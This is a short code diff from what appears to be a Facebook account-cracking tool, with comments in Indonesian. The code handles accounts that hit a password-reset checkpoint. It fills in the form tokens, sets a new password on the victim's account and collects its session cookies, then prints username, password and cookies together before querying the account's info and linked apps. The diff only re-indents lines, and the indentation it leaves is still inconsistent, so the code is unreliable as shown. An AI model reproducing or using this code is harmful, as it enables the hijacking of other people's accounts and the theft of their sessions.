@@ -645,14 +645,14 @@ class log_hasil(user, pasw):
         link3=resUbah.find("form",{"method":"post"})
         but2=["submit[Next]","nh","fb_dtsg","jazoest"]
       if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
-      if b in resUbah("input"):
-        if b.get("name") in but2:
+        if b in resUbah("input"):
+          if b.get("name") in but2:
           dat2.update({b.get("name"):b.get("value")})
           dat2.update({"password_new":"".join(pwBaru)})
           an=session.post(url+link3.get("action"),data=dat2)
           coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
           print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
-        if "checkpoint" not in coki:
+            if "checkpoint" not in coki:
           get_info(session,coki)
           cek_apk(session,coki)
         else:
